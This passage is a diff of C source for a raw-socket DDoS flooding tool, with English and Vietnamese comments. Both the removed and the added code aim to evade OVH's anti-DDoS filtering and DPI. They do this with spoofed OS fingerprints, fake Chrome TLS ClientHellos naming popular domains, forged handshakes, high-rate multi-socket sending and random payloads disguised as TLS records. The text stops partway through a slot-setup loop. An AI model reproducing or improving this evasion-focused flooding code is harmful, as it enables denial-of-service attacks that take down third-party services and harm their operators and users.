@@ -5,8 +5,14 @@
 #include <linux/if_ether.h>
 #include <linux/filter.h>
 #include <net/if.h>
+#include <net/if_arp.h>
 #include <poll.h>
 #include <sys/ioctl.h>
+#include <ifaddrs.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 static __thread Connection *active_conns_list = NULL;
 
@@ -1161,6 +1167,10 @@ int spawn_connection(int epoll_fd, int thread_id) {
     return 1;
 }
 
+/* ── Global stop flag for SIGINT/SIGTERM ── */
+static volatile sig_atomic_t g_stop = 0;
+static void _sig_stop_handler(int sig) { (void)sig; g_stop = 1; }
+
 void *worker_thread(void *arg) {
     int tid = *(int *)arg; free(arg);
     
@@ -1450,957 +1460,1281 @@ void *worker_thread(void *arg) {
         }
     }
     if (args.is_v17_tcp_bypass) {
-        // === V18 OVH FULL BYPASS ENGINE ===
-        // Strategy: ALL packets = full MTU 1514B for max Gbps/PPS
-        //   Hot send loop: PSH+ACK + ACK + RST+ACK mix at 1460B payload
-        //   Variable: TTL, window, src_port, seq, IP ID, payload type
-        //   3WHS: dedicated recv thread reads SYN-ACK → sends ACK to complete handshake
-        //         Once completed, slot marked ESTABLISHED -> passes stateful FW
-        //   Result: 9+ Gbps + bypass OVH VAC stateful inspection
+        if (args.is_v17_safe_proxy) goto v17_safe_mode;
 
-        int nc=sysconf(_SC_NPROCESSORS_ONLN);
-        cpu_set_t cset; CPU_ZERO(&cset);
-        CPU_SET(tid%nc,&cset);
-        pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&cset);
+    /* ══════════════════════════════════════════════════════════════════════
+     * PHẦN 0: PHÁT HIỆN MÔI TRƯỜNG — AUTO-DETECT
+     * ══════════════════════════════════════════════════════════════════════ */
+    int raw_cap = 0; /* 0=safe, 1=SOCK_RAW L3, 2=AF_PACKET L2 */
+    if (geteuid() == 0) {
+        int _t = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+        if (_t >= 0) { close(_t); raw_cap = 2; }
+        else {
+            _t = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+            if (_t >= 0) { close(_t); raw_cap = 1; }
+        }
+    }
 
-        unsigned int src_ip=get_local_ip();
-        if(!src_ip){LOG_ERR("T%d: no IP",tid);return NULL;}
+    /* CPU affinity — ghim thread vào core */
+    int _ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+    { cpu_set_t _cs; CPU_ZERO(&_cs);
+      CPU_SET((_ncpu > 1) ? (tid % (_ncpu-1))+1 : 0, &_cs);
+      pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &_cs); }
 
-        char iface[32]={0};
-        get_default_interface(iface,sizeof(iface));
-        if(!iface[0]){LOG_ERR("T%d: no iface",tid);return NULL;}
-        int ifindex=if_nametoindex(iface);
+    unsigned int src_ip = get_local_ip();
+    if (!src_ip) { LOG_ERR("T%d: Không lấy được IP nguồn", tid); return NULL; }
 
-        unsigned char src_mac[6]={0};
-        {char path[128];snprintf(path,sizeof(path),"/sys/class/net/%s/address",iface);
-         FILE *f=fopen(path,"r");if(f){int m[6];
-           if(fscanf(f,"%x:%x:%x:%x:%x:%x",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
-             for(int i=0;i<6;i++) src_mac[i]=m[i];
-           fclose(f);}}
+    /* ══════════════════════════════════════════════════════════════════════
+     * PHẦN 1: ĐỊNH NGHĨA CHUNG — OS PROFILES, TLS, HTTP/2
+     * ══════════════════════════════════════════════════════════════════════ */
 
-        unsigned char gw_mac[6]={0};
-        {unsigned int gw_ip=0;
-         FILE *fr=fopen("/proc/net/route","r");
-         if(fr){char ln[256];
-           while(fgets(ln,sizeof(ln),fr)){char ri[32];unsigned long rd,rg;
-             if(sscanf(ln,"%31s %lx %lx",ri,&rd,&rg)==3&&rd==0&&rg!=0){
-               gw_ip=(unsigned int)rg;break;}}
-           fclose(fr);}
-         if(gw_ip){struct in_addr ga;ga.s_addr=gw_ip;
-           char cmd[128];snprintf(cmd,sizeof(cmd),"ping -c1 -W1 %s>/dev/null 2>&1",inet_ntoa(ga));
-           if(system(cmd)){} usleep(50000);
-           FILE *fa=fopen("/proc/net/arp","r");
-           if(fa){char ln[256];if(fgets(ln,sizeof(ln),fa)){}
-             while(fgets(ln,sizeof(ln),fa)){char ai[64],am[64];int t,fl;
-               if(sscanf(ln,"%63s 0x%x 0x%x %17s",ai,&t,&fl,am)>=4&&
-                  inet_addr(ai)==gw_ip){
-                 int m[6];if(sscanf(am,"%x:%x:%x:%x:%x:%x",
-                                    &m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
-                   for(int i=0;i<6;i++) gw_mac[i]=m[i];
-                 break;}}
-             fclose(fa);}}}
+    /* --- 4 OS Profile cho TCP options SYN --- */
+    /* Mỗi profile gồm: TTL, window, MSS, WScale, SACK_PERM, Timestamps */
+    typedef struct {
+        unsigned char ttl;
+        unsigned short window;
+        unsigned short mss;
+        unsigned char wscale;
+        unsigned char sack_perm; /* 1=có SACK Permitted */
+        unsigned char has_ts;    /* 1=có Timestamp option */
+        const char *name;
+    } V17OsProfile;
 
-        // Auto-detect: try AF_PACKET (full VM), fall back to AF_INET SOCK_RAW (container)
-        int _probe = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-        int use_afp = (_probe >= 0);
-        if (_probe >= 0) close(_probe);
-        if (!use_afp) {
-            LOG_INFO("T%d: AF_PACKET unavailable (container mode) -> AF_INET SOCK_RAW fallback", tid);
+    static const V17OsProfile v17_profiles[] = {
+        /* Windows 10/11 — Chrome/Edge */
+        { .ttl=128, .window=64240, .mss=1460, .wscale=8,
+          .sack_perm=1, .has_ts=1, .name="Win10" },
+        /* Linux 5.x/6.x — Chrome/Firefox */
+        { .ttl=64,  .window=65535, .mss=1460, .wscale=7,
+          .sack_perm=1, .has_ts=1, .name="Linux" },
+        /* macOS 13+ — Safari/Chrome */
+        { .ttl=64,  .window=65535, .mss=1460, .wscale=6,
+          .sack_perm=1, .has_ts=1, .name="macOS" },
+        /* iOS 16+ — Safari */
+        { .ttl=64,  .window=65535, .mss=1400, .wscale=6,
+          .sack_perm=1, .has_ts=0, .name="iOS" },
+    };
+    int n_profiles = sizeof(v17_profiles) / sizeof(v17_profiles[0]);
+
+    /* --- Xây SYN packet với TCP options theo OS profile --- */
+    /* Trả về tổng chiều dài TCP header (20 + options) */
+    #define V17_BUILD_SYN_OPTS(opts_ptr, prof, ts_val, opt_total_len) do { \
+        unsigned char *_op = (opts_ptr); int _p = 0; \
+        /* MSS */ \
+        _op[_p++]=2; _op[_p++]=4; \
+        _op[_p++]=(prof).mss>>8; _op[_p++]=(prof).mss&0xFF; \
+        if ((prof).sack_perm) { _op[_p++]=4; _op[_p++]=2; } /* SACK Permitted */ \
+        if ((prof).has_ts) { \
+            _op[_p++]=8; _op[_p++]=10; \
+            unsigned int _tv=(ts_val); \
+            _op[_p++]=(_tv>>24)&0xFF; _op[_p++]=(_tv>>16)&0xFF; \
+            _op[_p++]=(_tv>>8)&0xFF;  _op[_p++]=_tv&0xFF; \
+            _op[_p++]=0;_op[_p++]=0;_op[_p++]=0;_op[_p++]=0; \
+        } \
+        _op[_p++]=1; /* NOP */ \
+        _op[_p++]=3; _op[_p++]=3; _op[_p++]=(prof).wscale; /* Window Scale */ \
+        while (_p % 4 != 0) _op[_p++] = 0; /* Pad to 4-byte boundary */ \
+        (opt_total_len) = _p; \
+    } while(0)
+
+    /* --- TLS ClientHello builder (Chrome 120+ JA3 fingerprint) --- */
+    /* Xây dựng ClientHello TLS 1.2/1.3 hợp lệ với GREASE, SNI, extensions */
+    /* Trả về chiều dài payload TLS */
+    #define V17_MAX_CH_SIZE 600
+    /* Macro inline vì không thể định nghĩa hàm trong hàm (C standard) */
+
+    /* --- SNI domains cho TLS ClientHello --- */
+    static const char *v17_sni_domains[] = {
+        "www.google.com","api.cloudflare.com","cdn.jsdelivr.net",
+        "static.cloudflareinsights.com","www.microsoft.com",
+        "login.microsoftonline.com","api.github.com","www.amazon.com",
+        "fonts.googleapis.com","ajax.googleapis.com",
+        "www.youtube.com","accounts.google.com",
+        "ssl.gstatic.com","www.gstatic.com",
+        "www.facebook.com","edge.microsoft.com",
+        "update.googleapis.com","clients1.google.com",
+        "www.googleapis.com","storage.googleapis.com",
+        "www.instagram.com","www.twitter.com",
+        "cdnjs.cloudflare.com","unpkg.com",
+        "checkout.stripe.com","api.stripe.com",
+        "cdn.shopify.com","fonts.gstatic.com",
+        "www.paypal.com","code.jquery.com"
+    };
+    int n_sni = 30;
+
+    /* --- HTTP/2 connection preface + SETTINGS + WINDOW_UPDATE --- */
+    static const unsigned char v17_h2_preface[] = {
+        /* PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n (24 bytes) */
+        0x50,0x52,0x49,0x20,0x2a,0x20,0x48,0x54,
+        0x54,0x50,0x2f,0x32,0x2e,0x30,0x0d,0x0a,
+        0x0d,0x0a,0x53,0x4d,0x0d,0x0a,0x0d,0x0a,
+        /* SETTINGS frame: len=18, type=4, flags=0, stream=0 */
+        0x00,0x00,0x12,0x04,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x01,0x00,0x00,0x10,0x00, /* HEADER_TABLE_SIZE=4096 */
+        0x00,0x02,0x00,0x00,0x00,0x00, /* ENABLE_PUSH=0 */
+        0x00,0x03,0x00,0x00,0x00,0x64, /* MAX_CONCURRENT_STREAMS=100 */
+        /* WINDOW_UPDATE: len=4, type=8, flags=0, stream=0 */
+        0x00,0x00,0x04,0x08,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x0f,0x00,0x01 /* increment=983041 */
+    };
+
+    /* --- Adaptive rate controller (chia sẻ giữa threads) --- */
+    static _Atomic int v17_current_rate = 0;
+    static volatile long long v17_last_adjust_ms = 0;
+    if (tid == 0 && v17_current_rate == 0) {
+        v17_current_rate = args.rate;
+        v17_last_adjust_ms = get_ms();
+    }
+
+    /* ══════════════════════════════════════════════════════════════════════
+     * PHẦN 2: RAW MODE — AF_PACKET / SOCK_RAW
+     * ══════════════════════════════════════════════════════════════════════
+     * Khi có quyền root: Stateful 3WHS + TLS ClientHello + batch sendmmsg
+     * Hiệu suất tối đa: 5-10+ Gbps tùy NIC
+     * ══════════════════════════════════════════════════════════════════════ */
+    if (raw_cap > 0) {
+        LOG_INFO("T%d: RAW MODE (cap=%d: %s) — full L4 spoofing",
+                 tid, raw_cap, raw_cap==2?"AF_PACKET":"SOCK_RAW");
+
+        /* --- Lấy interface + MAC bằng ioctl (không dùng /proc) --- */
+        char r_iface[32] = {0};
+        unsigned char r_src_mac[6] = {0}, r_gw_mac[6] = {0};
+        int r_ifindex = 0;
+
+        /* Tìm interface mặc định qua getifaddrs */
+        { struct ifaddrs *ifas, *ifa;
+          if (getifaddrs(&ifas) == 0) {
+              for (ifa=ifas; ifa; ifa=ifa->ifa_next) {
+                  if (!ifa->ifa_addr || ifa->ifa_addr->sa_family!=AF_INET) continue;
+                  if (strcmp(ifa->ifa_name,"lo")==0) continue;
+                  if (ifa->ifa_flags & IFF_UP) {
+                      strncpy(r_iface, ifa->ifa_name, 31);
+                      break;
+                  }
+              }
+              freeifaddrs(ifas);
+          }
+        }
+        if (!r_iface[0]) { strncpy(r_iface, "eth0", 31); }
+        r_ifindex = if_nametoindex(r_iface);
+
+        /* Lấy MAC của interface bằng ioctl */
+        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
+          struct ifreq ifr; memset(&ifr,0,sizeof(ifr));
+          strncpy(ifr.ifr_name, r_iface, IFNAMSIZ-1);
+          if (ioctl(_s, SIOCGIFHWADDR, &ifr) == 0)
+              memcpy(r_src_mac, ifr.ifr_hwaddr.sa_data, 6);
+          close(_s);
         }
 
-        int fd_send, fd_send2;
-        if(use_afp){
-            fd_send=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
-            struct sockaddr_ll sl={0};
-            sl.sll_family=AF_PACKET;sl.sll_ifindex=ifindex;sl.sll_protocol=htons(ETH_P_IP);
-            bind(fd_send,(struct sockaddr*)&sl,sizeof(sl));
-            int q=1;setsockopt(fd_send,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
-            fd_send2=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
-            bind(fd_send2,(struct sockaddr*)&sl,sizeof(sl));
-            setsockopt(fd_send2,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
-        } else {
-            fd_send=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
-            int h=1;setsockopt(fd_send,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
-            fd_send2=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
-            setsockopt(fd_send2,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
+        /* Bước 1: Lấy gateway IP từ /proc/net/route */
+        unsigned int _gw_ip = 0;
+        { FILE *_rfp = fopen("/proc/net/route", "r");
+          if (_rfp) {
+              char _rline[256], _rifc[32];
+              unsigned int _rdst, _rgw, _rflags, _rmask;
+              /* Bỏ header */
+              if (fgets(_rline, sizeof(_rline), _rfp)) {}
+              while (fgets(_rline, sizeof(_rline), _rfp)) {
+                  if (sscanf(_rline, "%31s %x %x %x %*s %*s %*s %x",
+                             _rifc, &_rdst, &_rgw, &_rflags, &_rmask) == 5) {
+                      /* Default route: dst=0, flag RTF_GATEWAY(0x2), gw!=0 */
+                      if (_rdst == 0 && (_rflags & 0x2) && _rgw != 0) {
+                          _gw_ip = _rgw; /* network byte order */
+                          break;
+                      }
+                  }
+              }
+              fclose(_rfp);
+          }
         }
-        {int sb=64*1024*1024;
-         setsockopt(fd_send,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
-         setsockopt(fd_send2,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
+        /* Bước 2: Trigger ARP cho gateway (hoặc target nếu cùng subnet) */
+        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
+          struct sockaddr_in _dst = {0};
+          _dst.sin_family = AF_INET;
+          _dst.sin_addr.s_addr = (_gw_ip != 0) ? _gw_ip : bin_target_ip;
+          _dst.sin_port = htons(80);
+          connect(_s, (struct sockaddr*)&_dst, sizeof(_dst));
+          close(_s);
+          usleep(60000); /* Chờ ARP resolve */
         }
-
-        struct sockaddr_ll dst_sll={0};
-        dst_sll.sll_family=AF_PACKET;dst_sll.sll_ifindex=ifindex;
-        dst_sll.sll_halen=6;memcpy(dst_sll.sll_addr,gw_mac,6);
-        dst_sll.sll_protocol=htons(ETH_P_IP);
-
-        // Raw socket fallback destination (used when GW MAC not available)
-        struct sockaddr_in raw_dst={0};
-        raw_dst.sin_family=AF_INET;
-        raw_dst.sin_addr.s_addr=bin_target_ip;
-        raw_dst.sin_port=bin_target_port; // not used by kernel for IPPROTO_RAW
-
-        // Recv socket for SYN-ACK (3WHS completion)
-        int fd_recv;
-        if (use_afp) {
-            fd_recv = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-            {
-                // BPF: only accept TCP SYN-ACK from our target IP
-                unsigned int tip = ntohl(bin_target_ip);
-                struct sock_filter bpf_syn_ack[] = {
-                    { 0x28, 0, 0, 0x0000000c },
-                    { 0x15, 0, 11, 0x00000800 },
-                    { 0x30, 0, 0, 0x00000017 },
-                    { 0x15, 0, 9,  0x00000006 },
-                    { 0x20, 0, 0, 0x0000001a },
-                    { 0x15, 0, 7, tip },
-                    { 0x28, 0, 0, 0x00000014 },
-                    { 0x45, 5, 0, 0x00001fff },
-                    { 0xb1, 0, 0, 0x0000000e },
-                    { 0x50, 0, 0, 0x0000001b },
-                    { 0x54, 0, 0, 0x00000012 },
-                    { 0x15, 0, 1, 0x00000012 },
-                    { 0x6,  0, 0, 0x00040000 },
-                    { 0x6,  0, 0, 0x00000000 },
-                };
-                struct sock_fprog prog={sizeof(bpf_syn_ack)/sizeof(bpf_syn_ack[0]),bpf_syn_ack};
-                setsockopt(fd_recv,SOL_SOCKET,SO_ATTACH_FILTER,&prog,sizeof(prog));
-                int rb=512*1024; setsockopt(fd_recv,SOL_SOCKET,SO_RCVBUF,&rb,sizeof(rb));
-            }
-        } else {
-            // Container mode: AF_INET SOCK_RAW receives IP+TCP (no ETH header)
-            // CAP_NET_RAW is sufficient for this — works in GitHub Codespaces
-            fd_recv = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-            int rb = 512*1024; setsockopt(fd_recv, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
+        /* Bước 3: SIOCGARP với gateway IP */
+        { int _s = socket(AF_INET, SOCK_DGRAM, 0);
+          struct arpreq arq; memset(&arq, 0, sizeof(arq));
+          struct sockaddr_in *_arp_sin = (struct sockaddr_in*)&arq.arp_pa;
+          _arp_sin->sin_family = AF_INET;
+          _arp_sin->sin_addr.s_addr = (_gw_ip != 0) ? _gw_ip : bin_target_ip;
+          strncpy(arq.arp_dev, r_iface, IFNAMSIZ-1);
+          if (ioctl(_s, SIOCGARP, &arq) == 0 && (arq.arp_flags & ATF_COM))
+              memcpy(r_gw_mac, arq.arp_ha.sa_data, 6);
+          close(_s);
+          /* KVM/virtio: nếu không lấy được gateway MAC, dùng broadcast FF:FF:FF:FF:FF:FF */
+          int _mac_ok = 0;
+          for (int _mi = 0; _mi < 6; _mi++) if (r_gw_mac[_mi]) { _mac_ok = 1; break; }
+          if (!_mac_ok) {
+              /* Fallback: broadcast MAC — hoạt động trên KVM virtio-net */
+              memset(r_gw_mac, 0xff, 6);
+              LOG_INFO("T%d: KVM detected, using broadcast MAC FF:FF:FF:FF:FF:FF", tid);
+          }
         }
 
-        // === CONSTANTS ===
-        #define V17B     4096
-        #define V17ETH   14
-        #define V17IP    20
-        #define V17TCP   32   // 20 hdr + 12 option bytes (NOP,NOP,TS,tsval[4],tsecr[4])
-        #define V17PL   1428  // Reduced by 12 to keep total frame <= 1514
-        #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
-        #define HUGE_PL_SIZE (1024 * 1024) // 1MB random payload buffer
+        /* --- Tạo raw socket để gửi --- */
+        /* Trên KVM: ưu tiên SOCK_RAW L3 (không cần MAC/ifindex) */
+        int r_fd_send, r_fd_send2;
+        /* Force dùng SOCK_RAW L3 trên KVM — AF_PACKET cần MAC phần cứng thực */
+        int r_use_afp = 0; /* Disable AF_PACKET trên KVM để tránh drop */
+        struct sockaddr_ll r_dst_sll = {0};
+        struct sockaddr_in r_raw_dst = {0};
 
-        // Slot state
-        #define ST_SYN_SENT    0
-        #define ST_ESTABLISHED 1
-        #define ST_FORCE_EST   2  // Fallback: blast without 3WHS (for stateless FW/router paths)
+        /* Luôn dùng SOCK_RAW L3 — kernel tự routing, không cần MAC */
+        r_fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        int _h1=1; setsockopt(r_fd_send, IPPROTO_IP, IP_HDRINCL, &_h1, sizeof(_h1));
+        r_fd_send2 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        setsockopt(r_fd_send2, IPPROTO_IP, IP_HDRINCL, &_h1, sizeof(_h1));
+        /* Socket 3 + 4: phân tải kernel NIC queue */
+        int r_fd_send3 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        setsockopt(r_fd_send3, IPPROTO_IP, IP_HDRINCL, &_h1, sizeof(_h1));
+        int r_fd_send4 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        setsockopt(r_fd_send4, IPPROTO_IP, IP_HDRINCL, &_h1, sizeof(_h1));
+        r_raw_dst.sin_family=AF_INET;
+        r_raw_dst.sin_addr.s_addr=bin_target_ip;
 
-        // Max SYN retries before falling back to force blast
-        // 3 retries ≈ ~30 rounds ≈ fast enough for stateful, fallback quick enough for stateless
-        #define SYN_MAX_RETRY  3
-
-        // No ramp — full power from round 1
-        #define SOFT_START_ROUNDS 1
-
-
-
-        // TTL table (expanded: Linux/Win/Mac/FreeBSD/Cisco/Solaris/AIX)
-        static const unsigned char ttl_t[]={
-            64,64,64,63,128,128,64,117,255,63,64,128,64,60,
-            64,128,64,64,117,64,64,128,64,63,255,64,60,128,
-            64,63,128,255,64,64,128,64};
-        int ttl_sz=sizeof(ttl_t);
-
-        // Window table (expanded: more OS fingerprints)
-        static const unsigned short win_t[]={
-            8192,16384,32768,65535,29200,14600,43690,
-            26880,8760,32120,16060,26280,65535,4096,
-            28960,14480,5840,5792,65520,64240,32767};
-        int win_sz=(int)(sizeof(win_t)/sizeof(win_t[0]));
-
-        // Allocate per-slot data (heap, not stack)
-        unsigned char (*vbuf)[V17FLEN]=malloc(V17B*V17FLEN);
-        struct mmsghdr *vmsg=calloc(V17B,sizeof(struct mmsghdr));
-        struct iovec   *viov=calloc(V17B,sizeof(struct iovec));
-        unsigned int *tcp_base=calloc(V17B,sizeof(unsigned int));
-        unsigned int *ip_base =calloc(V17B,sizeof(unsigned int));
-        unsigned int *slot_seq=calloc(V17B,sizeof(unsigned int));
-        unsigned int *slot_ack=calloc(V17B,sizeof(unsigned int));
-        unsigned short*slot_sp=calloc(V17B,sizeof(unsigned short));
-        int           *slot_st=calloc(V17B,sizeof(int)); // state
-        unsigned int  *slot_rn=calloc(V17B,sizeof(unsigned int)); // round counter
-        unsigned int  *slot_syn_sent=calloc(V17B,sizeof(unsigned int));
-        unsigned char *slot_ttl=calloc(V17B,sizeof(unsigned char)); // Fixed TTL per slot
-        unsigned short*slot_win=calloc(V17B,sizeof(unsigned short)); // Fixed window per slot
-        unsigned char *slot_tls_ver=calloc(V17B,sizeof(unsigned char)); // Fixed TLS version per slot
-        unsigned char *slot_ch_sent=calloc(V17B,sizeof(unsigned char)); // ClientHello sent flag
-        unsigned int  *slot_tsval=calloc(V17B,sizeof(unsigned int)); // TCP timestamp value per slot
-        unsigned int  *slot_tsecr=calloc(V17B,sizeof(unsigned int)); // TCP timestamp echo reply (server tsval)
-        unsigned char *slot_wscale=calloc(V17B,sizeof(unsigned char)); // Window scale factor per slot
-        unsigned int  *slot_pl_sum=calloc(V17B,sizeof(unsigned int)); // Cached payload checksum
-        unsigned short *slot_ipid=calloc(V17B,sizeof(unsigned short)); // DWC: sequential IP ID per connection
-
-        // Huge Payload Buffer for O(1) random data & DPI bypass
-        unsigned char *huge_pl_buf = malloc(HUGE_PL_SIZE);
-        unsigned int *huge_pl_sum = calloc(HUGE_PL_SIZE / 2 + 1, sizeof(unsigned int));
-        if(!huge_pl_buf || !huge_pl_sum) {
-            LOG_ERR("T%d: HUGE_PL_SIZE malloc failed", tid);
-            return NULL;
+        { int sb=64*1024*1024; /* 64MB per socket × 4 = 256MB total */
+          int bp=100; /* SO_BUSY_POLL: giảm interrupt latency */
+          int _fds[4]={r_fd_send,r_fd_send2,r_fd_send3,r_fd_send4};
+          for(int _fi=0;_fi<4;_fi++){
+              setsockopt(_fds[_fi],SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
+              setsockopt(_fds[_fi],SOL_SOCKET,SO_BUSY_POLL,&bp,sizeof(bp));
+              setsockopt(_fds[_fi],SOL_SOCKET,SO_REUSEADDR,&_h1,sizeof(_h1));
+              struct sockaddr_in _baddr={0};
+              _baddr.sin_family=AF_INET;
+              _baddr.sin_addr.s_addr=src_ip;
+              bind(_fds[_fi],(struct sockaddr*)&_baddr,sizeof(_baddr));
+          }
         }
 
-        // Init Huge Buffer & Prefix Sum with High Entropy Random Data for L4 Bypass
-        unsigned int current_sum = 0;
-        unsigned short *hpw = (unsigned short *)huge_pl_buf;
-        huge_pl_sum[0] = 0;
-        for (int k = 0; k < HUGE_PL_SIZE / 2; k++) {
-            hpw[k] = (unsigned short)(fast_rand() & 0xFFFF);
-            current_sum += hpw[k];
-            huge_pl_sum[k + 1] = current_sum;
+        /* --- Recv socket cho SYN-ACK (BPF filter) --- */
+        int r_fd_recv = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+        { struct sock_filter bpf_sa[] = {
+            {0x28,0,0,0x0c}, {0x15,0,5,0x0800}, {0x30,0,0,0x17},
+            {0x15,0,3,0x06}, {0x28,0,0,0x14}, {0x45,1,0,0x1fff},
+            {0xb1,0,0,0x0e}, {0x50,0,0,0x1b}, {0x54,0,0,0x12},
+            {0x15,0,1,0x12}, {0x6,0,0,0x40000}, {0x6,0,0,0}
+          };
+          struct sock_fprog prog = {12, bpf_sa};
+          setsockopt(r_fd_recv, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
+          int rb=512*1024; setsockopt(r_fd_recv, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
         }
 
-        // Realistic timestamp base: approximate kernel boot jiffies (250Hz)
-        unsigned int ts_boot_base = (unsigned int)(time(NULL) % 86400) * 250;
+        /* --- Slot arrays --- */
+        #define R_SLOTS 16384  /* Max concurrent connections */
+        #define R_ETH 14
+        #define R_IP 20
+        #define R_TCP 20
+        #define R_PL 1440
+        #define R_FLEN (R_ETH+R_IP+R_TCP+R_PL)
 
-        // sport→slot lookup for recv processing (full random range now)
-        int *port_to_slot = malloc(65536 * sizeof(int));
-        for(int i=0; i<65536; i++) port_to_slot[i] = -1;        // Initialize all slots
-        for(int b=0;b<V17B;b++){
-            memset(vbuf[b],0,V17FLEN);
-            unsigned char *fr=vbuf[b];
+        #define R_ST_SYN   0
+        #define R_ST_EST   1
+        #define R_ST_FORCE 2
 
-            // Ethernet
-            if(use_afp){memcpy(fr,gw_mac,6);memcpy(fr+6,src_mac,6);fr[12]=8;fr[13]=0;}
+        unsigned char (*r_buf)[R_FLEN] = malloc(R_SLOTS * R_FLEN);
+        struct mmsghdr *r_msg = calloc(R_SLOTS, sizeof(struct mmsghdr));
+        struct iovec *r_iov = calloc(R_SLOTS, sizeof(struct iovec));
+        unsigned int *r_seq = calloc(R_SLOTS, sizeof(unsigned int));
+        unsigned int *r_ack = calloc(R_SLOTS, sizeof(unsigned int));
+        unsigned short *r_sp = calloc(R_SLOTS, sizeof(unsigned short));
+        int *r_st = calloc(R_SLOTS, sizeof(int));
+        unsigned int *r_rn = calloc(R_SLOTS, sizeof(unsigned int));
+        unsigned int *r_syn_cnt = calloc(R_SLOTS, sizeof(unsigned int));
+        int *r_prof_idx = calloc(R_SLOTS, sizeof(int)); /* OS profile index */
+        unsigned short *r_ipid = calloc(R_SLOTS, sizeof(unsigned short));
+        unsigned int *r_tsval = calloc(R_SLOTS, sizeof(unsigned int));
+        unsigned char *r_ch_sent = calloc(R_SLOTS, sizeof(unsigned char));
+        int *r_port_map = malloc(65536 * sizeof(int));
+        /* Pre-computed checksum bases — O(1) per packet instead of O(n=730) */
+        unsigned int *r_base_cs = calloc(R_SLOTS, sizeof(unsigned int)); /* TCP cs base */
+        unsigned int *r_base_ip = calloc(R_SLOTS, sizeof(unsigned int)); /* IP cs base */
 
-            // IP
-            struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
-            ih->ihl=5;ih->version=4;ih->tot_len=htons(V17IP+V17TCP+V17PL);
-            ih->frag_off=htons(0x4000); // DWC FIX: Always DF — modern OS never sends without DF
-            ih->ttl=ttl_t[b%ttl_sz];
+        /* Huge random payload buffer + prefix sum cho O(1) checksum */
+        #define R_HUGE_PL (4*1024*1024) /* 4MB — nhiều variation hơn */
+        unsigned char *r_huge = malloc(R_HUGE_PL);
+        unsigned int *r_huge_sum = calloc(R_HUGE_PL/2+1, sizeof(unsigned int));
+        { unsigned int cs=0; unsigned short *hw=(unsigned short*)r_huge;
+          r_huge_sum[0]=0;
+          for(int k=0;k<R_HUGE_PL/2;k++){
+              hw[k]=(unsigned short)(fast_rand()&0xFFFF);
+              cs+=hw[k]; r_huge_sum[k+1]=cs;
+          }
+          /* Fix TLS header bytes in prefix sum — overwrite first 5 words */
+          hw[0]=htons(0x1703); hw[1]=htons(0x0300|((R_PL-5)>>8));
+          hw[2]=htons(((R_PL-5)&0xFF)<<8);
+          /* Recompute first few sums */
+          for(int k=0;k<8;k++) r_huge_sum[k+1]=r_huge_sum[k]+hw[k];
+        }
+
+        /* Recv + SYN + ACK buffer */
+        unsigned char *r_recv_buf = malloc(4096);
+        unsigned char *r_syn_buf = malloc(R_FLEN);
+        unsigned char *r_ack_buf = malloc(R_FLEN);
+        memset(r_syn_buf,0,R_FLEN); memset(r_ack_buf,0,R_FLEN);
+
+        /* Khởi tạo port map + slots */
+        for (int i=0;i<65536;i++) r_port_map[i]=-1;
+        for (int b=0;b<R_SLOTS;b++) {
+            memset(r_buf[b],0,R_FLEN);
+            unsigned char *fr = r_buf[b];
+
+            /* Profile ngẫu nhiên */
+            r_prof_idx[b] = fast_rand() % n_profiles;
+            const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];
+
+            /* Ethernet header */
+            if (r_use_afp) { memcpy(fr,r_gw_mac,6); memcpy(fr+6,r_src_mac,6); fr[12]=8;fr[13]=0; }
+
+            /* IP header */
+            struct iphdr *ih = (struct iphdr*)(fr+R_ETH);
+            ih->ihl=5; ih->version=4; ih->tot_len=htons(R_IP+R_TCP+R_PL);
+            ih->frag_off=htons(0x4000); ih->ttl=prof->ttl;
             ih->protocol=IPPROTO_TCP;
             ih->saddr=src_ip; ih->daddr=bin_target_ip;
 
-            // TCP RST bypass — mixed flags
-            struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
+            /* TCP header (PSH+ACK default cho data sending) */
+            struct tcphdr *th = (struct tcphdr*)(fr+R_ETH+R_IP);
             unsigned short p;
-            do { p = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p] != -1);
-            slot_sp[b]=p;
-            port_to_slot[p]=b;
-            slot_seq[b]=fast_rand();
-            slot_ack[b]=fast_rand();
-            // 100% stateful 3WHS — FW creates real session entries, won't drop data
